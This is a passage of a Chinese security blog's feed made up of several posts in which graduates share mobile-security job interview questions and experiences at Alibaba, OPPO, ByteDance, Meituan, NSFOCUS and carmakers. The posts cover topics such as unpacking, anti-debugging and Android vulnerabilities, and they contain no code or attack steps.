title="https://github.com/microsoft/vscode-cpptools/releases/tag/1.13.9">https://github.com/microsoft/vscode-cpptools/releases/tag/1.13.9</a></li><li><a href="https://mp.weixin.qq.com/s/9Gm0dhdVI08kDqLi3gez1g" title="https://mp.weixin.qq.com/s/9Gm0dhdVI08kDqLi3gez1g">https://mp.weixin.qq.com/s/9Gm0dhdVI08kDqLi3gez1g</a></li><li><a href="https://mp.weixin.qq.com/s/eSeEVTfTSMY8eYcLI5PIeg" title="https://mp.weixin.qq.com/s/eSeEVTfTSMY8eYcLI5PIeg">https://mp.weixin.qq.com/s/eSeEVTfTSMY8eYcLI5PIeg</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;一种修改-amp-阅读AOSP的新方式&quot;&gt;&lt;a href=&quot;#一种修改-amp-阅读AOSP的新方式&quot; class=&quot;headerlink&quot; title=&quot;一种修改&amp;amp;阅读AOSP的新方式&quot;&gt;&lt;/a&gt;一种修改&amp;amp;阅读AOSP的新方式&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;之前写过了如何使用docker编译AOSP的方案，目前这个方案在Ubuntu上面还算是比较完美的，但是问题又来了，虽然说在docker当中是可以用vim来实现代码的阅读和编辑的，但是要是有个ide，那看起来岂不是更爽，然后要是能有一个网页在线的IDE，那岂不是爽上加爽了，本着这个思路，然后就开始了一顿方案的查找，最终找到了一个还算是不错的方案。&lt;/p&gt;
&lt;p&gt;然后就找到了&lt;code&gt;code-server&lt;/code&gt;这个网页版的vscode，如果我在docker启动之后，然后再打开这个服务，是不是我就可以在浏览器当中直接访问和修改AOSP代码了，目前评估一下，这个方案大概率是可行的，所以呢，也就有了本篇文章。&lt;/p&gt;
&lt;p&gt;作者：littleQ&lt;/p&gt;</summary>
    
    
    
    <category term="Android开发" scheme="http://security-kitchen.com/categories/Android%E5%BC%80%E5%8F%91/"/>
    
    
    <category term="Android开发" scheme="http://security-kitchen.com/tags/Android%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>移动安全面试（8）——2023届阿里安全工程师面试经验分享</title>
    <link href="http://security-kitchen.com/2023/03/08/interview0008/"/>
    <id>http://security-kitchen.com/2023/03/08/interview0008/</id>
    <published>2023-03-08T02:28:19.000Z</published>
    <updated>2023-12-23T09:13:44.117Z</updated>
    
    <content type="html"><![CDATA[<h2 id="2023届阿里安全工程师面试经验分享"><a href="#2023届阿里安全工程师面试经验分享" class="headerlink" title="2023届阿里安全工程师面试经验分享"></a>2023届阿里安全工程师面试经验分享</h2><p>大家好，我是同学小D，某985硕，硕士研究的方向是移动安全，分享一下秋招面试阿里的一些经验。<br>阿里我是找了一个认识的人内推到了他们部门，然后面试的岗位是安全工程师。最好是有内部认识的人内推，不然今年可能面试的机会都没有。然后我面的安全岗是没有笔试的，这边也没有hr给你约面试时间，基本就是给你打个电话就直接开始电话面试。</p><span id="more"></span><h3 id="一面"><a href="#一面" class="headerlink" title="一面"></a>一面</h3><p>一面就是内推人来面，基本就是问了下对安卓安全的了解的一些基本情况，例如：</p><p>so加载流程总结？</p><p>so注入&#x2F;防止so注入 怎么去检测？</p><p>如何检测修改了系统源码&#x2F;如何反反反调试？</p><p>有没有分析过真实的壳？</p><h3 id="二面"><a href="#二面" class="headerlink" title="二面"></a>二面</h3><p>二面当时是有三个面试官进行面试，然后也是电话面试，问的问题就比较细致：</p><p>一代、二代、Vmp、dex2C的原理，以及脱壳的原理？</p><p>平时使用什么语言编程？讲一讲python的深拷贝、浅拷贝？</p><p>反frida、反xposed的方法和原理？</p><p>ida调试的原理?</p><p>在字节实习做的工作？解决了哪些问题？</p><p>arm汇编的知识点？</p><p>安卓中有哪些hook方法？inline hook、plt hook的原理？</p><p>在学校中做的工作，详细问一些细节？</p><p>virtual app原理？</p><p>二进制分析中遇到的最有难度的问题？怎么解决的？</p><p>OLLVM混淆的原理，如何解决OLLVM混淆？</p><p>安卓相关安全漏洞原理？</p><p>对web、js相关漏洞是否了解？</p><h3 id="三面"><a href="#三面" class="headerlink" title="三面"></a>三面</h3><p>三面和二面问的东西基本上差不多，都是安卓安全的一些知识。</p><h3 id="四面"><a href="#四面" class="headerlink" title="四面"></a>四面</h3><p>四面是部门的大leader来面</p><p>主要问你做的方向是什么，在网络安全这个有多少年经验了？</p><p>做过的最有意思的项目？</p><p>最有成就感的事？</p><p>如果你被其他厂录取，你是否更愿意来阿里？</p><p>然后很扯的是前面几面都告诉我通过了，最后等了很久有一天阿里的人打电话问我有没有其他offer了，当时我想着如实回答就说已经签了一家保底，然后那边就说既然你已经签了那我们这边流程就不再进行了。所以建议如果其他offer还没确定拿到或者其他拿到的offer还不是很满意可以先说没有，因为今年好像是各个公司的hc也很紧张，他们也怕你接了offer又不去。然后建议大家在秋招开始之前能先实习就找个地方实习，有实习经验还是很加分的。</p><p>整体情况就是这些，希望能帮助到大家！</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;2023届阿里安全工程师面试经验分享&quot;&gt;&lt;a href=&quot;#2023届阿里安全工程师面试经验分享&quot; class=&quot;headerlink&quot; title=&quot;2023届阿里安全工程师面试经验分享&quot;&gt;&lt;/a&gt;2023届阿里安全工程师面试经验分享&lt;/h2&gt;&lt;p&gt;大家好，我是同学小D，某985硕，硕士研究的方向是移动安全，分享一下秋招面试阿里的一些经验。&lt;br&gt;阿里我是找了一个认识的人内推到了他们部门，然后面试的岗位是安全工程师。最好是有内部认识的人内推，不然今年可能面试的机会都没有。然后我面的安全岗是没有笔试的，这边也没有hr给你约面试时间，基本就是给你打个电话就直接开始电话面试。&lt;/p&gt;</summary>
    
    
    
    <category term="移动安全面试" scheme="http://security-kitchen.com/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8%E9%9D%A2%E8%AF%95/"/>
    
    
    <category term="移动安全面试" scheme="http://security-kitchen.com/tags/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8%E9%9D%A2%E8%AF%95/"/>
    
    <category term="面试" scheme="http://security-kitchen.com/tags/%E9%9D%A2%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>移动安全面试（7）——2023届OPPO秋季招聘面试</title>
    <link href="http://security-kitchen.com/2023/03/08/interview0007/"/>
    <id>http://security-kitchen.com/2023/03/08/interview0007/</id>
    <published>2023-03-08T02:27:19.000Z</published>
    <updated>2023-12-23T09:13:44.117Z</updated>
    
    <content type="html"><![CDATA[<p>大家好！我是同学小E，某985硕，前面看过几个大佬的面试介绍，今天也来分享一下，我自己的面试经历，面试的是OPPO的移动安全实验室，听说oppo有两个移动安全实验室铂安和子午，具体是哪一个我也不清楚，面试结果：顺利拿到offer。</p><span id="more"></span><p>今年行情不好的情况，拿到oppo的offer还是十分开心的，有朋友说OPPO是学历厂，简历筛选比较看重学历，这个从今年的情况来看，可能确实有点，因为身边很多双985的朋友或211+985朋友简历挂了好多，可能今年的名额很少，不过感觉如果你和招聘要求比较符合，应211硕应该简历也能过，总体评估是这样。</p><p>OPPO面试的总体感觉比较好：一轮初试+两轮复试+一轮hr面试，遇到的所有面试官都比较和善，不会的问题也耐心解答，hr小姐姐也十分的温柔，感觉和面试官以及hr都聊的很开心。</p><p><strong>初试：</strong></p><p>初试的对象应该是同事，问的问题也比较温和，首先是自我介绍，这个我就简单介绍了一下个人经历。研究生期间发表过一篇B会，获得20个CVE的漏洞编号，参加了一些ctf的比赛并取得名次。然后就介绍了参与的一些实验室项目经历，就没有了。</p><p>然后和面试官相互交流了下学习心得体会，感觉大家聊的挺开心的，这个过程中顺道问了简历上的第一个项目，讲解了下项目背景，以及里面担任什么样的角色，以及遇到了哪些问题，怎么解决的。</p><p>接着就是问了一些<strong>技术问题</strong>：</p><p>Android框架层常见的漏洞及原理，请列举几个。（这里主要回答了Binder方面的几个经典漏洞）</p><p>如何进行Fuzz去挖掘一些漏洞，Fuzz的原理以及现有的一些通用的Fuzz工具。（这里会问你挖到的漏洞，然后以一个漏洞为例，进行深入的询问，不停的询问漏洞的原理以及如何使用Fuzz挖掘，有没有对一些Fuzz进行改进）</p><p>关于Fuzz这一块问了很多。</p><p>Fuzz技术的原理？</p><p>Fuzz技术的分类？</p><p>当前主流的Fuzz工具？</p><p>Fuzz的切入点？</p><p>例如如何获取Ibinder对象？</p><p>data如何构造？</p><p>然后就问了不了解webview漏洞？</p><p>关于这个我之前还看了看雪2020SDC研究嘉宾OPPO安全实验室何恩的《WebView安全攻防指南》，然后结合自己目前发现的一些，就回答了一下。</p><p>到这里基本一轮面试就完了，接着就是和面试官相互聊天，谈论一些看法。</p><p><strong>复试一轮：</strong></p><p>这一面的面试官主要问APP层面的漏洞，怎么说了APP层面漏洞我也了解一些，不过没做过总结，感觉一部分和web上漏洞其实挺像，这里借用一下星球里群主总结的感觉大概也是这些</p><p><img src="https://tcs.teambition.net/storage/312q3eefb3b9e93186c50e7cbeb25db0e38e?Signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJBcHBJRCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9hcHBJZCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9vcmdhbml6YXRpb25JZCI6IiIsImV4cCI6MTY3ODg2NjQwOCwiaWF0IjoxNjc4MjYxNjA4LCJyZXNvdXJjZSI6Ii9zdG9yYWdlLzMxMnEzZWVmYjNiOWU5MzE4NmM1MGU3Y2JlYjI1ZGIwZTM4ZSJ9.FmWBSXElD1c6_QU9V4A3QZP6Dnza7MPZeHBnWUUuKrM&download=image.png"></p><p>主要问了Deeplink漏洞的类型，让我举几个例子。</p><p>Jauns漏洞的原理？</p><p>Pendingintent漏洞原理</p><p>（还有一些漏洞我自己说的，这里说了很久）</p><p>然后问如何进行半自动化漏洞挖掘？（这里我也看了一些当前开源的工具 app层面基本都是规则）</p><p>还有一些半自动化的漏洞工具就是用污点分析？</p><p>这里就问了下污点分析的原理？以及如何进行污点分析去挖漏洞，说一下大致流程？</p><p>基本到这里就结束了，面试快结束，面试官表示印象不错，最后很快就通过了</p><p><strong>复试二轮：</strong></p><p>二轮面试估计是一个领导，面试的侧重点在于对整体把控，问项目很多，问细节很少？</p><p>三个项目轮番问了一遍？最多的问题就是你遇到这样问题怎么解决的？</p><p>然后就是当前研究的一些新的动向了解么？</p><p>你认为当前Android上面哪些漏洞危害较大，值得关注？</p><p>你对未来自己职业发展的一个规划？</p><p>等等吧（其他还有几个问题记不得了）</p><p><strong>hr面：</strong></p><p>hr面没什么区别，就是你是否单身，期望薪资，个人发展规划，城市要求等等</p><p>整体就是这样了，感觉面试过程比较轻松，面试官也挺好，大家春招可以去尝试下。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;大家好！我是同学小E，某985硕，前面看过几个大佬的面试介绍，今天也来分享一下，我自己的面试经历，面试的是OPPO的移动安全实验室，听说oppo有两个移动安全实验室铂安和子午，具体是哪一个我也不清楚，面试结果：顺利拿到offer。&lt;/p&gt;</summary>
    
    
    
    <category term="移动安全面试" scheme="http://security-kitchen.com/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8%E9%9D%A2%E8%AF%95/"/>
    
    
    <category term="移动安全面试" scheme="http://security-kitchen.com/tags/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8%E9%9D%A2%E8%AF%95/"/>
    
    <category term="面试" scheme="http://security-kitchen.com/tags/%E9%9D%A2%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>移动安全面试（6）——2023届字节秋季招聘面试</title>
    <link href="http://security-kitchen.com/2023/03/08/interview0006/"/>
    <id>http://security-kitchen.com/2023/03/08/interview0006/</id>
    <published>2023-03-08T02:26:19.000Z</published>
    <updated>2023-12-23T09:13:44.117Z</updated>
    
    <content type="html"><![CDATA[<p>大家好！我是同学小G，今天简单分享一下秋季招聘的面试心得。本来之前在秋招，群主当时问我在星球里面发了一波，今天再投稿一下公众号吧</p><p>面试岗位——字节（无痕实验室）安全研究工程师</p><span id="more"></span><p>面试结果：一面结束</p><p><strong>一面：</strong></p><p>介绍一下你了解的Android APP防护策略？</p><p>加壳脱壳：</p><p>现在加壳的分类？</p><p>如何进行加壳，你写过加壳器么?</p><p>如何进行脱壳，你写过脱壳机么？</p><p>你写的脱壳机和其他对比有什么特色？</p><p>如何防护你写的脱壳机？</p><p>如何防护市面上其他的脱壳机？</p><p>你有逆向字节的VMP加固么？</p><p>你对so层加壳有了解么？</p><p>调试与反调试：</p><p>说下你了解的调试手段？</p><p>如何进行反调试，有哪些方案？</p><p>如何针对反调试进行反反调试，有哪些方案？</p><p>如何对现有的反反调试进行解决，你有什么思路么？</p><p>混淆与反混淆：</p><p>说一下Unicorn的基本原理？</p><p>java层混合和so层混淆的发展，介绍一下？</p><p>java层混淆如何进行反混淆？</p><p>so层OLLVM如何进行反混淆？</p><p>你具体实现过unidbg进行ollvm反混淆么？</p><p>如果不考虑用ollvm混淆，你有什么能避免性能损失来进行防护的手段？</p><p>hook与反hook:</p><p>介绍一下Xposed的基本原理？</p><p>介绍一下frida的基本原理？</p><p>介绍一下检测Xposed的方式？</p><p>介绍一下检测frida的方式？</p><p>如何绕过检测Xposed的方式？</p><p>如何绕过检测frida的方式？</p><p>针对绕过Xposed检测的手段，怎么进行防护？</p><p>针对绕过frida检测的手段，怎么进行防护？</p><p>介绍一下inlinehook的基本原理？</p><p>如何去检测inlinehook?</p><p>列举一下你逆向大厂APP的经验？</p><p>你针对flutter的防护，如何进行绕过抓包？</p><p>列举一些常见的APP漏洞挖掘的手段？</p><p>你知道当前APP的黑产有哪些？</p><p>针对这些黑产有什么解决方案？</p><p><strong>算法题：</strong></p><p>无痕实验室好像到结束都会手撕一道算法题，算法题比较简单，一道有关链表排序的题</p><p><strong>结束语：</strong></p><p>虽然一面面试就失败了，不过积累了很多经验，所以大家可以多去面试，从面试中进行复习，这样的效率更高，不要害怕挂，那么多家公司总有一家是合适的，最后祝大家春招顺利。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;大家好！我是同学小G，今天简单分享一下秋季招聘的面试心得。本来之前在秋招，群主当时问我在星球里面发了一波，今天再投稿一下公众号吧&lt;/p&gt;
&lt;p&gt;面试岗位——字节（无痕实验室）安全研究工程师&lt;/p&gt;</summary>
    
    
    
    <category term="移动安全面试" scheme="http://security-kitchen.com/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8%E9%9D%A2%E8%AF%95/"/>
    
    
    <category term="移动安全面试" scheme="http://security-kitchen.com/tags/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8%E9%9D%A2%E8%AF%95/"/>
    
    <category term="面试" scheme="http://security-kitchen.com/tags/%E9%9D%A2%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>移动安全面试（5）——2023届蔚来_理想_小鹏秋季招聘面试</title>
    <link href="http://security-kitchen.com/2023/03/08/interview0005/"/>
    <id>http://security-kitchen.com/2023/03/08/interview0005/</id>
    <published>2023-03-08T02:25:19.000Z</published>
    <updated>2023-12-23T09:13:44.117Z</updated>
    
    <content type="html"><![CDATA[<p>这是本次面试宝典的最后一篇，这里也感谢各位朋友的投稿，包括还有一些朋友的投稿，由于投递的岗位问题差不多，就没有进行发布。移动安全面试基本问题更新差不多了，各个厂商的内容基本包括：Android逆向技术、Android底层漏洞挖掘、Android App漏洞挖掘、Android隐私合规检测、Android病毒样本分析、Android渗透测试等方面的内容。其中根据群友各同学拿的offer汇总消息来看，目前2023届移动安全方向拿到offer的公司：</p><span id="more"></span><p>抖音集团：已offer</p><p>阿里巴巴：已offer</p><p>腾讯：（目前未知）</p><p>美团：已offer</p><p>快手：已offer</p><p>京东：（目前未知）</p><p>华为：已offer</p><p>百度：（目前未知）</p><p>蚂蚁集团：已offer</p><p>网易：（目前未知）</p><p>小米：（目前未知）</p><p>拼多多：（目前未知）</p><p>中兴：目前未知</p><p>荣耀：已offer</p><p>OPPO：已offer</p><p>vivo: 目前未知</p><p>理想：已offer</p><p>蔚来：已offer</p><p>小鹏：已offer</p><p>同程旅行：已offer</p><p>滴滴：目前未知</p><p>度小满：已offer</p><p>微众银行：已offer</p><p>绿盟：目前未知</p><p>360：目前未知</p><p>奇安信：已offer</p><p>美的：已offer</p><p>海康威视：目前未知</p><p>科大讯飞：已offer</p><p>Hello单车：已offer</p><p>深信服：目前未知</p><p>梆梆：目前未知</p><p>爱加密：已offer</p><p>顶象：目前未知</p><p>联想：目前未知</p><p>长亭科技：目前未知</p><p>以上是统计了大家投递的移动安全岗的公司，春招的朋友可以参考。</p><p>今天介绍最后两位同学小H、小I的面试经历，面试公司蔚来、理想、小鹏，这里将三家的面试经历融合整理。</p><p><strong>一面：</strong></p><p>了解Android底层漏洞挖掘的方式么？</p><p>介绍一些常见的Android APP漏洞挖掘方式？</p><p>如何进行自动化的漏洞挖掘？</p><p>了解WebView漏洞挖掘的原理么？</p><p>做过渗透测试的工作么？</p><p>车载互联网上的漏洞有了解么？</p><p>编写过自动化测试框架么？</p><p>如何看待新能源汽车的安全问题？</p><p>有了解过云端、web端的测试工作么？</p><p><strong>二面：</strong></p><p>介绍一下Android APP漏洞挖掘的方法?</p><p>对云、windows渗透测试有了解么？</p><p>说一下未来的职业规划？</p><p>新能源汽车的未来安全需要注意的点？</p><p>你的学习经历与心得？</p><p>你看好新能源汽车的发展么？</p><p>你未来想朝哪个方向发展？</p><p><strong>HR面：</strong></p><p>你期望的城市？</p><p>你遇到过最困难的事？如何解决？</p><p>你期望的薪资？</p><p>你手里有多少offer？</p><p>你认为我们公司吸引你的地方？</p><p>如果我们公司和另外一家开的薪资一样，你会选我们么？</p><p>如果没有达到你的预期薪资，你还会选我们么？</p><p>你有女朋友么？以后两人一起来这个城市发展么？</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;这是本次面试宝典的最后一篇，这里也感谢各位朋友的投稿，包括还有一些朋友的投稿，由于投递的岗位问题差不多，就没有进行发布。移动安全面试基本问题更新差不多了，各个厂商的内容基本包括：Android逆向技术、Android底层漏洞挖掘、Android App漏洞挖掘、Android隐私合规检测、Android病毒样本分析、Android渗透测试等方面的内容。其中根据群友各同学拿的offer汇总消息来看，目前2023届移动安全方向拿到offer的公司：&lt;/p&gt;</summary>
    
    
    
    <category term="移动安全面试" scheme="http://security-kitchen.com/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8%E9%9D%A2%E8%AF%95/"/>
    
    
    <category term="移动安全面试" scheme="http://security-kitchen.com/tags/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8%E9%9D%A2%E8%AF%95/"/>
    
    <category term="面试" scheme="http://security-kitchen.com/tags/%E9%9D%A2%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>移动安全面试（4）——2023届美团秋季招聘</title>
    <link href="http://security-kitchen.com/2023/03/08/interview0004/"/>
    <id>http://security-kitchen.com/2023/03/08/interview0004/</id>
    <published>2023-03-08T02:24:19.000Z</published>
    <updated>2023-12-23T09:13:44.117Z</updated>
    
    <content type="html"><![CDATA[<p>大家好，我是小A，应群主邀请，这里给大家分享一下我参加美团秋季校园招聘的心得！也很感谢在群主星球《安全后厨》里面学习到很多知识，对面试很有帮助。</p><p>美团移动安全招聘总共：</p><p>一轮笔试+五轮面试：一轮初试   +   两轮复试   +   一轮加面   +   一轮hr面</p><span id="more"></span><p><strong>第一轮笔试：</strong></p><p>美团的笔试都是统一的笔试题，这里题型包括五道算法题，题目难度：应该好像是两道简单 + 两道中等 + 一道hard题</p><p>不过要求可能不一样，针对开发的朋友要求较高，可能需要大部分的题型都做出了，针对安全的朋友要求可能低一点，不过今年的形式很严峻，大家能做出来，尽量还是多做一点，我当时就只做出3道半，因为自己算法题刷的很少，基本就刷了不到300道题，不过感觉安全的朋友做个大概，应该笔试都能过。</p><p><strong>面试：</strong></p><p>面试的话我建议简历制作还是十分重要的，因为简历的内容可以引导面试官去询问你擅长的方向，所以尽量将自己的简历做的完善一点，而且很多事情也可以作为面试的加分项，例如CVE&#x2F;CNVD漏洞、安全顶会、github开源项目、博客文章、开源工具、CTF比赛等等，有的话尽量写上，在今年秋招的过程中，这些可能能进一步增强你的优势。</p><p><strong>第一轮初试：（1h）</strong></p><p>美团第一轮初试给我的感觉就是问题很广，比较考察你个人的综合知识能力，这不仅仅包括你这个研究方向的知识，还会涉及很多计算机基础、编程语言方面知识，当然面试官会根据你的熟练程度去把握尺度，当时第一轮面试官也挺友善的，所以很多朋友去面试时，遇到不会的问题不要慌张，尽力就好。</p><p><strong>计算机基础：</strong></p><p><strong>操作系统：（操作系统感觉就把第二章准备熟练就可以了）</strong></p><p>进程和线程的区别？</p><p>进程间的通信方式？</p><p><strong>计算机网络：</strong></p><p>NAT的作用及原理？</p><p>Http与Https的区别？</p><p>一般好像安全岗位就操作系统和计算机网络问的要多一点，偶尔有些会加数据结构，其他的就都还好了</p><p><strong>编程语言：</strong></p><p>做移动安全Android的都知道基本要会arm、C&#x2F;C++、java、Android开发这几门语言，但一般安全岗的问题会比开发问的简单一点，所以大家掌握通用的一些问题就可以了</p><p><strong>C&#x2F;C++：</strong></p><p>全局变量，局部变量，const修饰的值保存在elf文件结构的哪里？</p><p>堆和栈的区别？</p><p><strong>java：</strong></p><p>Java与C++面向对象的区别？</p><p><strong>汇编：</strong></p><p>函数参数传递的过程？</p><p>函数返回有几种形式？</p><p><strong>Android开发：</strong></p><p>Android四大组件是什么？</p><p>Activity的生命周期？</p><p>Android进程之间的通信方式？</p><p>我觉的移动安全朋友基本的Android开发四大组件、intent数据传递、数据库、网络编程、等等还是需要掌握。</p><p><strong>安全相关问题：</strong></p><p><strong>逆向：</strong></p><p>Android加壳的种类，以及脱壳的原理？</p><p>so混淆的基本方式？</p><p>Android抓包防护？</p><p>怎么绕过SSLpining？</p><p>怎么针对Socket通信防护？</p><p>权限的分类？</p><p>Bindler通信原理？</p><p><strong>漏洞：</strong></p><p>介绍一下四大组件的漏洞挖掘过程？</p><p>会简单结合简历上的项目来开展询问</p><p><strong>第二轮复试：（55min）</strong></p><p>美团第二轮面试是团队的小组长面试，考察的更多在于综合能力的考察，更多是你对一个完整项目的把握，这个环节更多的去考察简历上的内容。</p><p><strong>技术方向：</strong></p><p>你认为一个APP的渗透测试工作怎么开展？其中会结合你回答的一些问题去穿插的问一下？例如Xposed和frida的工作原理，Xposed和frida的区别等</p><p>你认为如何开展一个APP的漏洞挖掘工作，这个过程中会结合一些经典的漏洞，去询问你原理，例如Janus漏洞呀等</p><p>你认为当前移动安全最新关注的一些方向以及可能遇到的一些困境在哪里？</p><p><strong>论文方向：</strong></p><p>我本人发表了一篇c刊，然后就针对论文问了一下解决的问题，创新点，考虑后续研究什么？</p><p><strong>其他问题：</strong></p><p>介绍了一下美团的移动安全的一些业务？我记得有漏洞的、逆向的、风控的好像这些吧</p><p>以及美团的一些技术沙龙，人才培养呀？</p><p>其他就是个人的一些提问？</p><p><strong>第三轮复试：（50min）</strong></p><p>美团第三轮面试是终端安全负责人进行面试，和第二面一样，不过考察更多在于你在项目中遇到一些问题如何解决，问题偏向整体</p><p><strong>技术方向：</strong></p><p>你如何开展漏洞挖掘工作？</p><p>如果要提高自动化的工具，你觉得漏洞挖掘如何能够更加自动化一点？</p><p>介绍你的两个项目，并说一些你做的工作的突出点？</p><p>你觉得团队合作中最重要的事情是什么？</p><p>你觉得要实现自动化的逆向工具，可能会需要哪些技术和哪些困境，针对这些困境，你觉得是你的话了，如何解决？</p><p>其他的和第二面重合比较大</p><p><strong>其他方向：</strong></p><p>你怎么规划你的职业发展路线的？</p><p>你进行提问环节</p><p><strong>第四轮面试-加面：（1h）</strong></p><p>第四轮面试是电话面，我以为是hr面了，结果是技术面，后来才知道安全基本都是4轮技术面，第四轮面试应该算压力面，全程感受到了被质疑，技术会不停深入，直到你不会？</p><p>说一下arm-vmp与dex-vmp的区别？</p><p>说一下当前dex-vmp的一些解决思路，以及新的vmp的混淆点，有了解么？</p><p>说一些ollvm的分类以及如何解决ollvm的初步思路</p><p>现在ollvm中你认为比较困难的点是哪些？</p><p>针对这些问题，你觉得如何进行解决，有没有什么好的思路？</p><p><strong>论文：</strong></p><p>你认为你论文的优势在哪？反正就是疯狂的质问，压力很大？</p><p>全程感受就是给很大的压力。</p><p><strong>第五轮面试-hr面：（30min）</strong></p><p>第五轮是hr面，到这个阶段基本就是问一些通用问题了</p><p>你遇到的问题，怎么解决？</p><p>你为什么选择我们之类等？</p><p>你项目中认为什么是最重要的？</p><p>最后祝大家春招顺利，也感谢群主对我秋招工作中的帮助！</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;大家好，我是小A，应群主邀请，这里给大家分享一下我参加美团秋季校园招聘的心得！也很感谢在群主星球《安全后厨》里面学习到很多知识，对面试很有帮助。&lt;/p&gt;
&lt;p&gt;美团移动安全招聘总共：&lt;/p&gt;
&lt;p&gt;一轮笔试+五轮面试：一轮初试   +   两轮复试   +   一轮加面   +   一轮hr面&lt;/p&gt;</summary>
    
    
    
    <category term="移动安全面试" scheme="http://security-kitchen.com/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8%E9%9D%A2%E8%AF%95/"/>
    
    
    <category term="移动安全面试" scheme="http://security-kitchen.com/tags/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8%E9%9D%A2%E8%AF%95/"/>
    
    <category term="面试" scheme="http://security-kitchen.com/tags/%E9%9D%A2%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>移动安全面试（3）——2023届绿盟秋季招聘面试</title>
    <link href="http://security-kitchen.com/2023/03/08/interview0003/"/>
    <id>http://security-kitchen.com/2023/03/08/interview0003/</id>
    <published>2023-03-08T02:23:19.000Z</published>
    <updated>2023-12-23T09:13:44.116Z</updated>
    
    <content type="html"><![CDATA[<p>大家好！我是小C，今天在这里分享一下我的面试经历，本人某中部211硕，本科期间学习网络工程，研究生期间跨考到信息安全专业，然后导师这边一个方向是做Android安全的，当时觉得比较感兴趣就选择了，自己属于比较佛系，然后对技术的激情可能也没有那么强烈，同们很多实验室的同学有搞Fuzz，有搞逆向的，自己前两年就到处整一整，感觉也没学到啥，好在幸运的是发了一篇二区sci，提前达到了毕业要求。</p><span id="more"></span><p>可能由于性格原因，找工作也十分的佛系，今年的秋季招聘大家都说地狱级的难度，确实从我们这个小实验室的情况就可以看出来，上一届师兄师姐人均大厂一个offer：阿里、腾讯、字节、百度、美团等，我们这一届好多能进面试阶段都十分艰难。按理说，我们实验室大部分还是双211偏多了吧，学历不算很高，但是以往几年，过一些大厂的简历筛选还是比较容易的，今年确实好多同门，要么就是简历没过，要么就是一面就挂，所以大家的心态都比较爆炸。</p><p>秋招期间听到最多的抱怨话就是大家表示自己研究生三年感觉白读，还不如本科毕业出来工作，对于这些，我也表示理解，因为确实今年全球经济不好，找工作难也是正常。而且因为可能本来就没有对自己抱有过高期望，所以秋招被打击了一遍又一遍，也感觉还好。</p><p>扯到这里，还是不说太多废话了，今天给大家分享绿盟一面的经历，哈哈，连第一轮都没过还是很失落的。</p><p><strong>绿盟一面（1h）：</strong></p><p>安全岗的好处就是很多公司都不用笔试，绿盟就是直接面试，第一面是技术面，我投递的是Android安全研究员，难度其实我觉得还好，感觉大部分问题都回答出来了，也可能是我自己认为的，哈哈。</p><p>绿盟的技术面试两个面试官交叉来问（我当时还在想着是因为确认才两个人来面，还有点小高兴，看来是自己想多了）</p><p><strong>技术面：</strong></p><p>Android漏洞方面：</p><p>介绍一下Android APP存在的漏洞面？（这里网上看了很多的文章，整理了一下，也读了群主的漏洞之战，觉得应该回答还可以吧）</p><p>列举你挖过的两个印象十分深刻的漏洞？（这个介绍了同门其他两个朋友挖的漏洞，漏洞原理比较清楚）</p><p>你了解SDK漏洞挖掘么？（列举了一个案例）</p><p>动态化漏洞挖掘中动态沙箱是怎么实现？（答了一半）</p><p>Android脱壳方面：</p><p>列举当前加壳的种类，脱壳机和其他的区别？（按寒冰大佬的文章回答的，列举了FART和youpk）</p><p>如果现在无法获取源码，你如何进行动态调试？（说了下软件断点调试和硬件断点调试）</p><p>你知道常见的反调试策略以及如何绕过？（说了一下网上通用的案例）</p><p>针对网络流量抓包防护，怎么解决？</p><p>你了解TCP、UDP协议栈么？</p><p>你在校期间做过哪些工具？（这个确实没有）</p><p>你了解哪些开发语言？</p><p><strong>其余问题：</strong></p><p>最多的就是女生为啥想到跨考到做安全？（我说谁没有一个黑客梦呢？嘿嘿）</p><p>以后的职业规划？（说实在，我没有想太多，随便扯了扯）</p><p>再就是一些我提问的问题？（说实在当时觉得对这个工作还是比较期望的，毕竟离家里近一点，而且听说安全研究院不是很忙(当然只是听说，哈哈)）</p><p><strong>最后</strong></p><p>面试完其实感觉自己答得还不错，结果第二天就收到挂了的消息了，还是比较失落的，不过后来想了想，自己对技术也没那么大激情。（硕士快毕业了，梦也醒了）</p><p>现在成功考上了家里的公务员选调，以后还是老老实实躺平吧，哈哈！</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;大家好！我是小C，今天在这里分享一下我的面试经历，本人某中部211硕，本科期间学习网络工程，研究生期间跨考到信息安全专业，然后导师这边一个方向是做Android安全的，当时觉得比较感兴趣就选择了，自己属于比较佛系，然后对技术的激情可能也没有那么强烈，同们很多实验室的同学有搞Fuzz，有搞逆向的，自己前两年就到处整一整，感觉也没学到啥，好在幸运的是发了一篇二区sci，提前达到了毕业要求。&lt;/p&gt;</summary>
    
    
    
